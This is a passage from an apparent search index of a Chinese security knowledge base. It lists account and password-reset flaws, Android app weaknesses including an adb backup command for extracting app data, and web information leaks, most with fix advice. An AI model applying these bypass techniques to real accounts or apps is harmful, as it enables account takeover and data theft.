session\u6216cookie\u7ed3\u6784\u592a\u7b80\u5355\uff0c\u5bb9\u6613\u88ab\u4f2a\u9020\uff1b","title":"session\u4e0ecookie\u95ee\u9898"},{"location":"vulnerability/account/#_14","text":"\u540e\u53f0\u90e8\u5206\u9875\u9762\u4e0d\u9700\u8981\u7ecf\u8fc7\u9274\u6743\u5373\u53ef\u767b\u5f55\u3002","title":"\u5782\u76f4\u8d8a\u6743\u8bbf\u95ee\u540e\u53f0\u9875\u9762"},{"location":"vulnerability/account/#_15","text":"\u8f93\u5165\u7528\u6237\u4fe1\u606f \u83b7\u53d6\u7528\u6237\u51ed\u8bc1\uff0c\u5e76\u4e14\u6821\u9a8c\u7528\u6237\u51ed\u8bc1 \u91cd\u7f6e\u5bc6\u7801 \u91cd\u7f6e\u6210\u529f\u767b\u5f55","title":"\u627e\u56de\u5bc6\u7801\u903b\u8f91\u9519\u8bef"},{"location":"vulnerability/account/#_16","text":"\u6821\u9a8c\u7ed3\u679c\u53ef\u63a7\u4ece\u800c\u5bfc\u81f4\u4efb\u610f\u8d26\u53f7\u5bc6\u7801\u91cd\u7f6e\u3002","title":"\u524d\u7aef\u6821\u9a8c\u51ed\u8bc1"},{"location":"vulnerability/account/#_17","text":"\u653b\u51fb\u8005\u5728\u6821\u9a8c\u7528\u6237\u51ed\u8bc1\u65f6\uff0c\u7531\u4e8e\u51ed\u8bc1\u8fc7\u4e8e\u7b80\u5355\u6216\u8005\u5931\u6548\u65f6\u95f4\u8fc7\u957f\u751a\u81f3\u4e0d\u5931\u6548\u7684\u95ee\u9898\u4ece\u800c\u5bf9\u51ed\u8bc1\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u3002","title":"\u627e\u56de\u5bc6\u7801\u51ed\u8bc1\u66b4\u529b\u7834\u89e3"},{"location":"vulnerability/account/#_18","text":"\u51ed\u8bc1\u4fe1\u606f\u8fd4\u56de\u5728response\u7684\u6570\u636e\u5305\u4e2d\uff0c\u6216\u8005\u76f4\u63a5\u4ee5URL\u7684\u5f62\u5f0f\u8fd4\u56de\u3002","title":"\u51ed\u8bc1\u8fd4\u56de\u9519\u8bef"},{"location":"vulnerability/account/#_19","text":"\u7531\u4e8e\u51ed\u8bc1\u672a\u4e0e\u7528\u6237\u4fe1\u606f\u7ed1\u5b9a\uff0c\u5bfc\u81f4\u53ef\u4ee5\u7528B\u7528\u6237\u7684\u51ed\u8bc1\u4fe1\u606f\u6765\u6821\u9a8cA\u7528\u6237\uff0c\u4ece\u800c\u5bfc\u81f4B\u91cd\u7f6e\u4e86A\u7528\u6237\u7684\u5bc6\u7801\u3002","title":"\u51ed\u8bc1\u4fe1\u606f\u4e0e\u7528\u6237\u4fe1\u606f\u4e0d\u7ed1\u5b9a"},{"location":"vulnerability/account/#token","text":"unix\u65f6\u95f4\u6233token\uff1b \u7528\u6237\u540d\u6216\u8005\u7528\u6237\u540d+\u5176\u5b83\u4fe1\u606f\u751f\u6210\u7684token\uff1b \u4f7f\u7528md5\u6216\u8005base64\u7f16\u7801\u751f\u6210\u7684token\uff1b","title":"\u90ae\u7bb1\u91cd\u7f6e\u5bc6\u7801\u5bb9\u6613\u51fa\u73b0\u5f31token"},{"location":"vulnerability/account/#cookie","text":"\u5728A\u7528\u6237\u91cd\u7f6e\u5bc6\u7801\u8fdb\u884c\u5230\u7b2c\u4e09\u6b65\u65f6\uff0c\u4e0d\u5173\u95ed\u9875\u9762\uff1b \u65b0\u5efa\u4e00\u4e2atab\u9875\u9762\uff0c\u91cd\u7f6eB\u7528\u6237\u7684\u5bc6\u7801\uff0c\u8fdb\u884c\u5230\u7b2c\u4e8c\u6b65\uff0c\u4e5f\u4e0d\u8981\u5173\u95ed\u9875\u9762\uff1b \u5237\u65b0\u7b2c\u4e00\u4e2a\u9875\u9762\uff0c\u8fd9\u4e2a\u65f6\u5019\u9875\u9762\u4e0a\u663e\u793a\u91cd\u7f6e\u7684\u5c31\u662fB\u7528\u6237\u7684\u5bc6\u7801\uff0c\u4ece\u800c\u8fbe\u5230A\u7528\u6237\u91cd\u7f6e\u4e86B\u7528\u6237\u7684\u5bc6\u7801\uff1b","title":"Cookie\u8986\u76d6"},{"location":"vulnerability/account/#_20","text":"\u76f4\u63a5\u8df3\u8fc7\u7b2c\u4e8c\u6b65\u6821\u9a8c\u7528\u6237\u4e0e\u51ed\u8bc1\u7684\u8fc7\u7a0b\u3002","title":"\u627e\u56de\u6b65\u9aa4\u4e0a\u4e0b\u6587\u8d8a\u6743"},{"location":"vulnerability/account/#_21","text":"000000 111111 666666 888888","title":"\u4e07\u80fd\u6821\u9a8c\u7801"},{"location":"vulnerability/account/#_22","text":"","title":"\u8d8a\u6743\u4fee\u6539\u3001\u67e5\u770b\u3001\u5220\u9664\u7528\u6237\u4fe1\u606f\u6f0f\u6d1e"},{"location":"vulnerability/account/#_23","text":"\u4ec5\u8fdb\u884c\u59d3\u540d\u57df\u8eab\u4efd\u8bc1\u53f7\u6838\u5bf9\uff1a\u6700\u57fa\u7840\u7684\u8ba4\u8bc1\u624b\u6bb5\uff0c\u7531\u4e8e\u5927\u91cf\u7684\u8eab\u4efd\u4fe1\u606f\u6cc4\u6f0f\uff0c\u6b64\u79cd\u9a8c\u8bc1\u5df2\u7ecf\u4e0d\u5177\u5907\u4ec0\u4e48\u610f\u4e49\u4e86\u3002 \u8eab\u4efd\u8bc1\u56fe\u7247\u4e0a\u6b21\u6838\u5bf9\uff1a\u5355\u4e00\u4e0a\u6b21\u8eab\u4efd\u8bc1\u7167\u7247\u6ca1\u6709\u4ec0\u4e48\u5927\u7528\uff0c\u53cd\u800c\u5bb9\u6613\u9020\u6210\u56fe\u7247\u4fe1\u606f\u6cc4\u6f0f\u3002\u9700\u8981\u901a\u8fc7\u5176\u5b83\u8f85\u52a9\u624b\u6bb5\u6765\u9a8c\u8bc1\u56fe\u7247\u7684\u771f\u5b9e\u6027\u3002 \u94f6\u884c\u5361\u7ed1\u5b9a\u6838\u5bf9\uff1a\u76f8\u5bf9\u800c\u8a00\u5b89\u5168\u7b49\u7ea7\u8f83\u9ad8\uff0c\u4f46\u662f\u76ee\u524d\u9ed1\u5e02\u4e0a\u6709\u6210\u5957\u7684\u7528\u6237\u4fe1\u606f\u51fa\u552e\uff0c\u5305\u62ec\uff1a\u8eab\u4efd\u8bc1\u3001\u94f6\u884c\u5361\u3001\u7167\u7247\u7b49\u4fe1\u606f\u3002 \u4eba\u8138\u8bc6\u522b\u6838\u5bf9\uff1a\u4eba\u8138\u8bc6\u522b\u7cbe\u5ea6\u8f83\u4f4e\uff1b\u5229\u7528\u4fee\u56fe\u6280\u672f\u7ed5\u8fc7\u4eba\u8138\u8bc6\u522b\uff1b\u76f8\u50cf\u7684\u4eba\u53ef\u4ee5\u7ed5\u8fc7\u4eba\u8138\u8bc6\u522b\u3002","title":"\u5b9e\u540d\u8ba4\u8bc1\u6f0f\u6d1e"},{"location":"vulnerability/app_vul/","text":"APP\u5b89\u5168\u6f0f\u6d1e \u4efb\u610f\u7528\u6237\u767b\u5f55 token\u751f\u6210\u7b97\u6cd5\u53ef\u9006\uff08token\u751f\u6210\u7b97\u6cd5\u5728\u672c\u5730\uff0c\u4e14app\u672a\u52a0\u56fa\u5bfc\u81f4\u53ef\u4ee5\u76f4\u63a5\u53cd\u7f16\u8bd1\u751f\u6210\u4efb\u610ftoken\uff09\u3002 \u5728shared_prefs\u76ee\u5f55\u4e2d\uff0c\u5b58\u5728\u4e00\u4e2a\u7528\u6237\u767b\u5f55\u4fe1\u606f\u6587\u4ef6\uff0c\u91cc\u9762\u6709\u7528\u6237\u540d\u5bc6\u7801\uff0c\u6211\u4eec\u628a\u7528\u6237\u540d\u4fee\u6539\u4e3a\u4e00\u4e2a\u5176\u4ed6\u7684\u5df2\u77e5\u5b58\u5728\u7684\u7528\u6237\u540d\uff0c\u5bc6\u7801\u4efb\u610f\u3002\u91cd\u65b0\u6253\u5f00app\uff0c\u53d1\u73b0\u7528\u6237\u767b\u5f55\u6210\u529f\u3002 Android APP AllowBackup # \u6f0f\u6d1e\u539f\u56e0:cat manifest.xml application android:allowBackup= true # \u5907\u4efd\u8bed\u53e5 adb backup -nosystem -noshared -apk -f com.*.ab(\u5907\u4efd\u540d\u5b57) com.package(\u4f60\u8981\u5907\u4efd\u7684\u5305) # \u6062\u590d\u8bed\u53e5 adb restore com.*.ab \u65e5\u5fd7\u6cc4\u6f0f\u654f\u611f\u4fe1\u606f \u65e5\u5fd7\u6cc4\u6f0f\u8d26\u53f7\u5bc6\u7801\u3002 \u65e5\u5fd7\u6cc4\u6f0fhttp\u8bf7\u6c42\uff08\u6709\u7684\u65f6\u5019\u53ef\u4ee5\u7528\u6b64\u65b9\u6cd5\u6765\u7ed5\u8fc7https\u4e0d\u80fd\u6293\u5305\u7684\u95ee\u9898\uff09\u3002 \u652f\u4ed8\u7ed5\u8fc7 \u901a\u8fc7\u9006\u5411\uff0c\u7ed5\u8fc7\u652f\u4ed8\u3002\u53c2\u8003\uff1a \u4e00\u4e2a\u65b0\u624b\u7684\u9006\u5411\u4e4b\u8def\uff0c\u8bb0\u5f55\u4e0b\u6211\u641e\u4e0b \u654f\u611f\u4fe1\u606f\u6cc4\u6f0f apk\u6e90\u7801\u4e2d\u5b58\u653e\u90ae\u7bb1\u8d26\u53f7\u5bc6\u7801\u3001\u5185\u7f51\u5730\u5740\u3001\u63a5\u53e3\u4fe1\u606f\u7b49\u3002 \u672c\u5730\u6570\u636e\u5e93\u4e2d\u5b58\u653e\u7528\u6237\u4fe1\u606f\u3002 \u65e5\u5fd7\u4e2d\u663e\u793a\u767b\u5f55\u4fe1\u606f\u3002 \u6587\u4ef6\u6743\u9650\u6f0f\u6d1e \u6b63\u5e38\u7684\u6587\u4ef6\u6743\u9650\uff1arw-rw----\uff0c\u76ee\u5f55\u6743\u9650\uff1arwxrwx---\u3002 APP\u6f0f\u6d1e\u4e0e\u5229\u7528 \u7ec4\u4ef6\u6cc4\u6f0f \u6f0f\u6d1e\u539f\u56e0 \u7ec4\u4ef6\u5728\u88ab\u8c03\u7528\u65f6\u672a\u505a\u9a8c\u8bc1\u3002 \u5728\u8c03\u7528\u5176\u4ed6\u7ec4\u4ef6\u65f6\u672a\u505a\u9a8c\u8bc1\u3002 \u6f0f\u6d1e\u5229\u7528 \u8c03\u7528\u66b4\u9732\u7684\u7ec4\u4ef6\uff0c\u8fbe\u5230\u67d0\u79cd\u6548\u679c\uff0c\u83b7\u53d6\u67d0\u4e9b\u4fe1\u606f\uff0c\u6784\u9020\u67d0\u4e9b\u6570\u636e\u3002\u5982\uff1a\u8c03\u7528\u66b4\u9732\u7684\u7ec4\u4ef6\u53d1\u77ed\u4fe1\u3001\u5fae\u535a\u7b49\u3002 \u76d1\u542c\u66b4\u9732\u7ec4\u4ef6\uff0c\u8bfb\u53d6\u6570\u636e\u3002 \u4fee\u590d\u5efa\u8bae \u9a8c\u8bc1\u8f93\u5165\u4fe1\u606f\u3001\u9a8c\u8bc1\u7ec4\u4ef6\u8c03\u7528\u7b49\u3002android:exported\u8bbe\u7f6e\u4e3afalse\u3002 \u4f7f\u7528android:protectionLevel=\"signature\"\u3002\u9a8c\u8bc1\u8c03\u7528\u6765\u6e90\uff1b \u53cd\u7f16\u8bd1 \u6f0f\u6d1e\u539f\u56e0 APK\u5305\u975e\u5e38\u5bb9\u6613\u88ab\u53cd\u7f16\u8bd1\u6210\u53ef\u8bfb\u6587\u4ef6\uff0c\u7a0d\u52a0\u4fee\u6539\u5c31\u80fd\u91cd\u65b0\u6253\u5305\u6210\u65b0\u7684APK\u3002 \u6f0f\u6d1e\u5229\u7528 \u8f6f\u4ef6\u7834\u89e3\uff0c\u5185\u8d2d\u7834\u89e3\uff0c\u8f6f\u4ef6\u903b\u8f91\u4fee\u6539\uff0c\u63d2\u5165\u6076\u610f\u4ee3\u7801\uff0c\u66ff\u6362\u5e7f\u544a\u5546ID\u3002 \u4fee\u590d\u5efa\u8bae \u4f7f\u7528ProGuard\u7b49\u5de5\u5177\u6df7\u6dc6\u4ee3\u7801\uff0c\u91cd\u8981\u903b\u8f91\u7528NDK\u5b9e\u73b0\u3002 \u6f0f\u6d1e\u4e3e\u4f8b \u53cd\u7f16\u8bd1\u91cd\u6253\u5305FlappyBird\uff0c\u628a\u5e7f\u544a\u5546ID\u6362\u4e86\uff0c\u6e38\u620f\u6539\u52a0\u63d2\u4e00\u6bb5\u6076\u610f\u4ee3\u7801\u7b49\u7b49\u3002 \u6570\u636e\u5bf9\u5b58\u50a8\u4e0e\u4f20\u8f93 \u6f0f\u6d1e\u539f\u56e01 \u5916\u90e8\u5b58\u50a8\uff08SD\u5361\uff09\u4e0a\u7684\u6587\u4ef6\u6ca1\u6709\u6743\u9650\u7ba1\u7406\uff0c\u6240\u6709\u5e94\u7528\u90fd\u53ef\u8bfb\u53ef\u5199\u3002\u5f00\u53d1\u8005\u628a\u654f\u611f\u4fe1\u606f\u660e\u6587\u5b58\u5728SD\u5361\u4e0a\uff0c\u6216\u8005\u52a8\u6001\u52a0\u8f7d\u7684payload\u653e\u5728SD\u5361\u4e0a\u3002 \u6f0f\u6d1e\u5229\u75281 \u7a83\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u7be1\u6539\u914d\u7f6e\u6587\u4ef6\uff0c\u4fee\u6539payload\u903b\u8f91\u5e76\u91cd\u6253\u5305\u3002 \u4fee\u590d\u5efa\u8bae1 \u4e0d\u8981\u628a\u654f\u611f\u4fe1\u606f\u653e\u5728\u5916\u90e8\u5b58\u50a8\u4e0a\u9762\uff1b\u5728\u52a8\u6001\u52a0\u8f7d\u5916\u90e8\u8d44\u6e90\u7684\u65f6\u5019\u9a8c\u8bc1\u6587\u4ef6\u5b8c\u6574\u6027\u3002 \u6f0f\u6d1e\u539f\u56e02 \u4f7f\u7528\u5168\u5c40\u53ef\u8bfb\u5199\uff08MODE_WORLD_READABLE\uff0cMODE_WORLD_WRITEABLE\uff09\u7684\u5185\u90e8\u5b58\u50a8\u65b9\u5f0f\uff0c\u6216\u660e\u6587\u5b58\u50a8\u654f\u611f\u4fe1\u606f\uff08\u7528\u6237\u8d26\u53f7\u5bc6\u7801\u7b49\uff09\u3002 \u6f0f\u6d1e\u5229\u75282 \u5168\u5c40\u8bfb\u5199\u654f\u611f\u4fe1\u606f\uff0c\u6216 root \u540e\u8bfb\u53d6\u660e\u6587\u4fe1\u606f\u3002 \u4fee\u590d\u5efa\u8bae2 \u4e0d\u9002\u7528\u5168\u5c40\u53ef\u8bfb\u5199\u7684\u5185\u90e8\u5b58\u50a8\u65b9\u5f0f\uff0c\u4e0d\u660e\u6587\u5b58\u50a8\u7528\u6237\u8d26\u53f7\u5bc6\u7801\u3002 \u5bc6\u7801\u6cc4\u6f0f \u6f0f\u6d1e\u539f\u56e0 \u5bc6\u7801\u660e\u6587\u5b58\u50a8\uff0c\u4f20\u8f93\u3002 \u6f0f\u6d1e\u5229\u7528 root\u540e\u53ef\u8bfb\u5199\u5185\u90e8\u5b58\u50a8\u3002 SD\u5361\u5168\u5c40\u53ef\u8bfb\u5199\u3002 \u516c\u5171Wi-Fi\u6293\u5305\u83b7\u53d6\u8d26\u53f7\u5bc6\u7801\u3002 \u4fee\u590d\u5efa\u8bae \u5b9e\u7528\u6210\u719f\u7684\u52a0\u5bc6\u65b9\u6848\u3002\u4e0d\u8981\u628a\u5bc6\u7801\u660e\u6587\u5b58\u50a8\u5728SD\u5361\u4e0a\u3002 WebView \u6f0f\u6d1e\u539f\u56e0 \u6076\u610fAPP\u53ef\u4ee5\u6ce8\u5165JavaScript\u4ee3\u7801\u8fdb\u5165WebView\u4e2d\u7684\u7f51\u9875\uff0c\u7f51\u9875\u672a\u4f5c\u9a8c\u8bc1\u3002 \u6076\u610f\u7f51\u9875\u53ef\u4ee5\u6267\u884cJavaScript\u53cd\u8fc7\u6765\u8c03\u7528App\u4e2d\u6ce8\u518c\u8fc7\u7684\u65b9\u6cd5\uff0c\u6216\u8005\u4f7f\u7528\u8d44\u6e90\u3002 \u6f0f\u6d1e\u5229\u7528 \u6076\u610f\u7a0b\u5e8f\u5d4c\u5165Web APP\uff0c\u7136\u540e\u7a83\u53d6\u7528\u6237\u4fe1\u606f\u3002 \u6076\u610f\u7f51\u9875\u8fdc\u7a0b\u8c03\u7528APP\u4ee3\u7801\u3002\u66f4\u6709\u751a\u8005\uff0c\u901a\u8fc7Java Reflection\u8c03\u7528Runtime\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u4fee\u590d\u5efa\u8bae \u4e0d\u4f7f\u7528WebView\u4e2d\u7684setJavaScriptEnabled(true)\uff0c\u6216\u8005\u4f7f\u7528\u65f6\u5bf9\u8f93\u5165\u8fdb\u884c\u9a8c\u8bc1\u3002 \u5176\u5b83\u6f0f\u6d1e ROOT\u540e\u7684\u624b\u673a\u53ef\u4ee5\u4fee\u6539APP\u7684\u5185\u8d2d\uff0c\u6216\u8005\u5b89\u88c5\u5916\u6302APP\u7b49\uff1b \u6076\u610f\u7684\u5e7f\u544a\u5305\uff1b \u5229\u7528Next Intent\uff1b","title":"APP\u5b89\u5168\u6f0f\u6d1e"},{"location":"vulnerability/app_vul/#app","text":"","title":"APP\u5b89\u5168\u6f0f\u6d1e"},{"location":"vulnerability/app_vul/#_1","text":"token\u751f\u6210\u7b97\u6cd5\u53ef\u9006\uff08token\u751f\u6210\u7b97\u6cd5\u5728\u672c\u5730\uff0c\u4e14app\u672a\u52a0\u56fa\u5bfc\u81f4\u53ef\u4ee5\u76f4\u63a5\u53cd\u7f16\u8bd1\u751f\u6210\u4efb\u610ftoken\uff09\u3002 \u5728shared_prefs\u76ee\u5f55\u4e2d\uff0c\u5b58\u5728\u4e00\u4e2a\u7528\u6237\u767b\u5f55\u4fe1\u606f\u6587\u4ef6\uff0c\u91cc\u9762\u6709\u7528\u6237\u540d\u5bc6\u7801\uff0c\u6211\u4eec\u628a\u7528\u6237\u540d\u4fee\u6539\u4e3a\u4e00\u4e2a\u5176\u4ed6\u7684\u5df2\u77e5\u5b58\u5728\u7684\u7528\u6237\u540d\uff0c\u5bc6\u7801\u4efb\u610f\u3002\u91cd\u65b0\u6253\u5f00app\uff0c\u53d1\u73b0\u7528\u6237\u767b\u5f55\u6210\u529f\u3002","title":"\u4efb\u610f\u7528\u6237\u767b\u5f55"},{"location":"vulnerability/app_vul/#android-app-allowbackup","text":"# \u6f0f\u6d1e\u539f\u56e0:cat manifest.xml application android:allowBackup= true # \u5907\u4efd\u8bed\u53e5 adb backup -nosystem -noshared -apk -f com.*.ab(\u5907\u4efd\u540d\u5b57) com.package(\u4f60\u8981\u5907\u4efd\u7684\u5305) # \u6062\u590d\u8bed\u53e5 adb restore com.*.ab","title":"Android APP AllowBackup"},{"location":"vulnerability/app_vul/#_2","text":"\u65e5\u5fd7\u6cc4\u6f0f\u8d26\u53f7\u5bc6\u7801\u3002 \u65e5\u5fd7\u6cc4\u6f0fhttp\u8bf7\u6c42\uff08\u6709\u7684\u65f6\u5019\u53ef\u4ee5\u7528\u6b64\u65b9\u6cd5\u6765\u7ed5\u8fc7https\u4e0d\u80fd\u6293\u5305\u7684\u95ee\u9898\uff09\u3002","title":"\u65e5\u5fd7\u6cc4\u6f0f\u654f\u611f\u4fe1\u606f"},{"location":"vulnerability/app_vul/#_3","text":"\u901a\u8fc7\u9006\u5411\uff0c\u7ed5\u8fc7\u652f\u4ed8\u3002\u53c2\u8003\uff1a \u4e00\u4e2a\u65b0\u624b\u7684\u9006\u5411\u4e4b\u8def\uff0c\u8bb0\u5f55\u4e0b\u6211\u641e\u4e0b","title":"\u652f\u4ed8\u7ed5\u8fc7"},{"location":"vulnerability/app_vul/#_4","text":"apk\u6e90\u7801\u4e2d\u5b58\u653e\u90ae\u7bb1\u8d26\u53f7\u5bc6\u7801\u3001\u5185\u7f51\u5730\u5740\u3001\u63a5\u53e3\u4fe1\u606f\u7b49\u3002 \u672c\u5730\u6570\u636e\u5e93\u4e2d\u5b58\u653e\u7528\u6237\u4fe1\u606f\u3002 \u65e5\u5fd7\u4e2d\u663e\u793a\u767b\u5f55\u4fe1\u606f\u3002","title":"\u654f\u611f\u4fe1\u606f\u6cc4\u6f0f"},{"location":"vulnerability/app_vul/#_5","text":"\u6b63\u5e38\u7684\u6587\u4ef6\u6743\u9650\uff1arw-rw----\uff0c\u76ee\u5f55\u6743\u9650\uff1arwxrwx---\u3002","title":"\u6587\u4ef6\u6743\u9650\u6f0f\u6d1e"},{"location":"vulnerability/app_vul/#app_1","text":"","title":"APP\u6f0f\u6d1e\u4e0e\u5229\u7528"},{"location":"vulnerability/app_vul/#_6","text":"\u6f0f\u6d1e\u539f\u56e0 \u7ec4\u4ef6\u5728\u88ab\u8c03\u7528\u65f6\u672a\u505a\u9a8c\u8bc1\u3002 \u5728\u8c03\u7528\u5176\u4ed6\u7ec4\u4ef6\u65f6\u672a\u505a\u9a8c\u8bc1\u3002 \u6f0f\u6d1e\u5229\u7528 \u8c03\u7528\u66b4\u9732\u7684\u7ec4\u4ef6\uff0c\u8fbe\u5230\u67d0\u79cd\u6548\u679c\uff0c\u83b7\u53d6\u67d0\u4e9b\u4fe1\u606f\uff0c\u6784\u9020\u67d0\u4e9b\u6570\u636e\u3002\u5982\uff1a\u8c03\u7528\u66b4\u9732\u7684\u7ec4\u4ef6\u53d1\u77ed\u4fe1\u3001\u5fae\u535a\u7b49\u3002 \u76d1\u542c\u66b4\u9732\u7ec4\u4ef6\uff0c\u8bfb\u53d6\u6570\u636e\u3002 \u4fee\u590d\u5efa\u8bae \u9a8c\u8bc1\u8f93\u5165\u4fe1\u606f\u3001\u9a8c\u8bc1\u7ec4\u4ef6\u8c03\u7528\u7b49\u3002android:exported\u8bbe\u7f6e\u4e3afalse\u3002 \u4f7f\u7528android:protectionLevel=\"signature\"\u3002\u9a8c\u8bc1\u8c03\u7528\u6765\u6e90\uff1b","title":"\u7ec4\u4ef6\u6cc4\u6f0f"},{"location":"vulnerability/app_vul/#_7","text":"\u6f0f\u6d1e\u539f\u56e0 APK\u5305\u975e\u5e38\u5bb9\u6613\u88ab\u53cd\u7f16\u8bd1\u6210\u53ef\u8bfb\u6587\u4ef6\uff0c\u7a0d\u52a0\u4fee\u6539\u5c31\u80fd\u91cd\u65b0\u6253\u5305\u6210\u65b0\u7684APK\u3002 \u6f0f\u6d1e\u5229\u7528 \u8f6f\u4ef6\u7834\u89e3\uff0c\u5185\u8d2d\u7834\u89e3\uff0c\u8f6f\u4ef6\u903b\u8f91\u4fee\u6539\uff0c\u63d2\u5165\u6076\u610f\u4ee3\u7801\uff0c\u66ff\u6362\u5e7f\u544a\u5546ID\u3002 \u4fee\u590d\u5efa\u8bae \u4f7f\u7528ProGuard\u7b49\u5de5\u5177\u6df7\u6dc6\u4ee3\u7801\uff0c\u91cd\u8981\u903b\u8f91\u7528NDK\u5b9e\u73b0\u3002 \u6f0f\u6d1e\u4e3e\u4f8b \u53cd\u7f16\u8bd1\u91cd\u6253\u5305FlappyBird\uff0c\u628a\u5e7f\u544a\u5546ID\u6362\u4e86\uff0c\u6e38\u620f\u6539\u52a0\u63d2\u4e00\u6bb5\u6076\u610f\u4ee3\u7801\u7b49\u7b49\u3002","title":"\u53cd\u7f16\u8bd1"},{"location":"vulnerability/app_vul/#_8","text":"\u6f0f\u6d1e\u539f\u56e01 \u5916\u90e8\u5b58\u50a8\uff08SD\u5361\uff09\u4e0a\u7684\u6587\u4ef6\u6ca1\u6709\u6743\u9650\u7ba1\u7406\uff0c\u6240\u6709\u5e94\u7528\u90fd\u53ef\u8bfb\u53ef\u5199\u3002\u5f00\u53d1\u8005\u628a\u654f\u611f\u4fe1\u606f\u660e\u6587\u5b58\u5728SD\u5361\u4e0a\uff0c\u6216\u8005\u52a8\u6001\u52a0\u8f7d\u7684payload\u653e\u5728SD\u5361\u4e0a\u3002 \u6f0f\u6d1e\u5229\u75281 \u7a83\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u7be1\u6539\u914d\u7f6e\u6587\u4ef6\uff0c\u4fee\u6539payload\u903b\u8f91\u5e76\u91cd\u6253\u5305\u3002 \u4fee\u590d\u5efa\u8bae1 \u4e0d\u8981\u628a\u654f\u611f\u4fe1\u606f\u653e\u5728\u5916\u90e8\u5b58\u50a8\u4e0a\u9762\uff1b\u5728\u52a8\u6001\u52a0\u8f7d\u5916\u90e8\u8d44\u6e90\u7684\u65f6\u5019\u9a8c\u8bc1\u6587\u4ef6\u5b8c\u6574\u6027\u3002 \u6f0f\u6d1e\u539f\u56e02 \u4f7f\u7528\u5168\u5c40\u53ef\u8bfb\u5199\uff08MODE_WORLD_READABLE\uff0cMODE_WORLD_WRITEABLE\uff09\u7684\u5185\u90e8\u5b58\u50a8\u65b9\u5f0f\uff0c\u6216\u660e\u6587\u5b58\u50a8\u654f\u611f\u4fe1\u606f\uff08\u7528\u6237\u8d26\u53f7\u5bc6\u7801\u7b49\uff09\u3002 \u6f0f\u6d1e\u5229\u75282 \u5168\u5c40\u8bfb\u5199\u654f\u611f\u4fe1\u606f\uff0c\u6216 root \u540e\u8bfb\u53d6\u660e\u6587\u4fe1\u606f\u3002 \u4fee\u590d\u5efa\u8bae2 \u4e0d\u9002\u7528\u5168\u5c40\u53ef\u8bfb\u5199\u7684\u5185\u90e8\u5b58\u50a8\u65b9\u5f0f\uff0c\u4e0d\u660e\u6587\u5b58\u50a8\u7528\u6237\u8d26\u53f7\u5bc6\u7801\u3002","title":"\u6570\u636e\u5bf9\u5b58\u50a8\u4e0e\u4f20\u8f93"},{"location":"vulnerability/app_vul/#_9","text":"\u6f0f\u6d1e\u539f\u56e0 \u5bc6\u7801\u660e\u6587\u5b58\u50a8\uff0c\u4f20\u8f93\u3002 \u6f0f\u6d1e\u5229\u7528 root\u540e\u53ef\u8bfb\u5199\u5185\u90e8\u5b58\u50a8\u3002 SD\u5361\u5168\u5c40\u53ef\u8bfb\u5199\u3002 \u516c\u5171Wi-Fi\u6293\u5305\u83b7\u53d6\u8d26\u53f7\u5bc6\u7801\u3002 \u4fee\u590d\u5efa\u8bae \u5b9e\u7528\u6210\u719f\u7684\u52a0\u5bc6\u65b9\u6848\u3002\u4e0d\u8981\u628a\u5bc6\u7801\u660e\u6587\u5b58\u50a8\u5728SD\u5361\u4e0a\u3002","title":"\u5bc6\u7801\u6cc4\u6f0f"},{"location":"vulnerability/app_vul/#webview","text":"\u6f0f\u6d1e\u539f\u56e0 \u6076\u610fAPP\u53ef\u4ee5\u6ce8\u5165JavaScript\u4ee3\u7801\u8fdb\u5165WebView\u4e2d\u7684\u7f51\u9875\uff0c\u7f51\u9875\u672a\u4f5c\u9a8c\u8bc1\u3002 \u6076\u610f\u7f51\u9875\u53ef\u4ee5\u6267\u884cJavaScript\u53cd\u8fc7\u6765\u8c03\u7528App\u4e2d\u6ce8\u518c\u8fc7\u7684\u65b9\u6cd5\uff0c\u6216\u8005\u4f7f\u7528\u8d44\u6e90\u3002 \u6f0f\u6d1e\u5229\u7528 \u6076\u610f\u7a0b\u5e8f\u5d4c\u5165Web APP\uff0c\u7136\u540e\u7a83\u53d6\u7528\u6237\u4fe1\u606f\u3002 \u6076\u610f\u7f51\u9875\u8fdc\u7a0b\u8c03\u7528APP\u4ee3\u7801\u3002\u66f4\u6709\u751a\u8005\uff0c\u901a\u8fc7Java Reflection\u8c03\u7528Runtime\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u4fee\u590d\u5efa\u8bae \u4e0d\u4f7f\u7528WebView\u4e2d\u7684setJavaScriptEnabled(true)\uff0c\u6216\u8005\u4f7f\u7528\u65f6\u5bf9\u8f93\u5165\u8fdb\u884c\u9a8c\u8bc1\u3002","title":"WebView"},{"location":"vulnerability/app_vul/#_10","text":"ROOT\u540e\u7684\u624b\u673a\u53ef\u4ee5\u4fee\u6539APP\u7684\u5185\u8d2d\uff0c\u6216\u8005\u5b89\u88c5\u5916\u6302APP\u7b49\uff1b \u6076\u610f\u7684\u5e7f\u544a\u5305\uff1b \u5229\u7528Next Intent\uff1b","title":"\u5176\u5b83\u6f0f\u6d1e"},{"location":"vulnerability/information_leakage/","text":"\u4fe1\u606f\u6cc4\u6f0f \u5e38\u89c1\u7684\u4fe1\u606f\u6cc4\u6f0f\u9879 \u9ed8\u8ba4\u4e0e\u6d4b\u8bd5\u9875\u9762 phpinfo()\uff1aphp\u7684\u6d4b\u8bd5\u6587\u4ef6 test.cgi\uff1acgi\u6d4b\u8bd5\u6587\u4ef6 WEB-INF\u6cc4\u6f0f\uff1ajava web\u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55 # WEB-INF/web.xml\uff1a\u5982\u679c\u60f3\u8981\u5728\u9875\u9762\u4e2d\u76f4\u63a5\u8bbf\u95ee\u5176\u4e2d\u7684\u6587\u4ef6\uff0c\u5fc5\u987b\u901a\u8fc7web.xml\u6587\u4ef6\u5bf9\u8981\u8bbf\u95ee\u7684\u6587\u4ef6\u8fdb\u884c\u76f8\u5e94\u6620\u5c04\u624d\u80fd\u8bbf\u95ee # WEB-INF/classes/\uff1a\u5305\u542b\u4e86\u7ad9\u70b9\u6240\u6709\u7684class\u6587\u4ef6\uff0c\u5305\u62ecservlet class\u548c\u975eservlet class\uff0c\u4ed6\u4eec\u4e0d\u80fd\u5305\u542b\u5728.jar\u6587\u4ef6\u4e2d # WEB-INF/lib/\uff1a\u5b58\u653eweb\u5e94\u7528\u6240\u9700\u7684\u5404\u79cdjar\u6587\u4ef6\uff0c\u5982\uff1a\u6570\u636e\u5e93\u9a71\u52a8jar\u6587\u4ef6 # 